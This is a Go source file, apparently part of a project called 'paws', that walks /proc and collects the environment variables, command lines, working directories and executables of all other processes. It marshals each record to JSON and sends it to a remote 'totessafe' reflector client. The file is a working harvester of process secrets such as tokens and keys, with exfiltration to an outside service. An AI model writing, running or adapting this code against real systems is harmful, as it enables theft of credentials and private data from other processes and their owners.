package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/jessfraz/paws/moarpackets/types"
	"github.com/jessfraz/paws/totessafe/reflector"
)

func getProcInfo(client *reflector.InternalReflectorClient) {
	// Get information from the /proc filesystem for the processes.
	data, err := walkProc()
	if err != nil {
		log.Printf("walking /proc failed: %v", err)
		return
	}

	// Iterate over the pids and send to our client
	for _, process := range data {
		b, err := json.Marshal(process)
		if err != nil {
			log.Printf("marshal /proc data failed: %v", err)
			return
		}

		blob := &reflector.PawsBlob{
			Data: string(b),
		}
		if _, err = client.Client.Set(context.TODO(), blob); err != nil {
			log.Printf("sending proc data to totessafe client failed: %v", err)
		}
	}
}

func walkProc() (map[int]types.ProcBlob, error) {
	// Initialize our proc blob strcut array.
	pb := map[int]types.ProcBlob{}

	// Walk all files in /proc and get the env for each process. :)
	filepath.Walk("/proc", func(path string, fi os.FileInfo, err error) error {
		if err != nil {
			// Prevent panic by handling failure accessing a path
			return nil
		}

		if fi.IsDir() {
			// Return  early if it's a directory.
			return nil
		}

		// If the filepath base is not "environ" or "cmdline", lets ignore it.
		if filepath.Base(path) != "environ" &&
			filepath.Base(path) != "cmdline" &&
			filepath.Base(path) != "cwd" &&
			filepath.Base(path) != "exe" {
			return nil
		}

		// Check if the filepath prefix matches /proc/self or
		// /proc/1 and ignore it, since that is us.
		matchesSelf, err := filepath.Match("/proc/self/*", path)
		if err != nil {
			log.Printf("[/proc]: matching filepath %s to /proc/self failed: %v", path, err)
			return nil
		}
		selfPID := os.Getpid()
		matchesPIDOne, err := filepath.Match(fmt.Sprintf("/proc/%d/*", selfPID), path)
		if err != nil {
			log.Printf("[/proc]: matching filepath %s to /proc/%d failed: %v", path, selfPID, err)
			return nil
		}
		if matchesSelf || matchesPIDOne {
			return nil
		}

		// Let's parse the PID from the filepath.
		pidstr := strings.TrimSuffix(strings.TrimPrefix(path, "/proc/"), fmt.Sprintf("/%s", filepath.Base(path)))
		// Ignore task dir files and /proc/cmdline.
		if strings.Contains(pidstr, "/task/") || pidstr == "cmdline" {
			return nil
		}
		// Convert it to an int.
		pid, err := strconv.Atoi(pidstr)
		if err != nil {
			log.Printf("[/proc]: converting %q to int for path %s failed: %v", pidstr, path, err)
			return nil
		}
		// Initialize our pid int the proc blob map if it does not exist.
		p, ok := pb[pid]
		if !ok {
			p = types.ProcBlob{
				PID: pid,
			}
		}

		// At this point we should have an actual env file that we want.
		// Let's parse it and add it to our proc blob array.
		var file []byte
		if filepath.Base(path) != "cwd" {
			// Read the file.
			file, err = ioutil.ReadFile(path)
			if err != nil {
				if os.IsPermission(err) {
					// Ignore the permission errors or the logs are noisy.
					return nil
				}
				log.Printf("[/proc]: reading %q failed: %v", path, err)
				return nil
			}
		}
		switch base := filepath.Base(path); base {
		case "environ":
			// Parse the file.
			parts := parseProcFile(file)
			// Add the data to our process data.
			p.Env = parts
		case "cmdline":
			// Parse the file.
			parts := parseProcFile(file)
			// Add the data to our process data.
			p.Cmdline = parts
		case "cwd":
			// Add the data to our process data.
			cwd, err := os.Readlink(path)
			if err != nil {
				if os.IsPermission(err) {
					// Ignore the permission errors or the logs are noisy.
					return nil
				}
				log.Printf("[/proc]: read link %q failed: %v", path, err)
				return nil
			}
			p.Cwd = cwd
		case "exe":
			// Add the data to our process data.
			p.Exe = string(file)
		default:
			log.Printf("[/proc]: base filepath unsupported: %q", base)
			return nil
		}

		// Append this pid's environ to the proc blob array.
		pb[pid] = p

		return nil
	})

	return pb, nil
}

func parseProcFile(data []byte) []string {
	if len(data) == 0 {
		return nil
	}
	if data[len(data)-1] == 0 {
		data = data[:len(data)-1]
	}
	parts := bytes.Split(data, []byte{0})
	var strParts []string
	for _, p := range parts {
		strParts = append(strParts, string(p))
	}

	return strParts
}
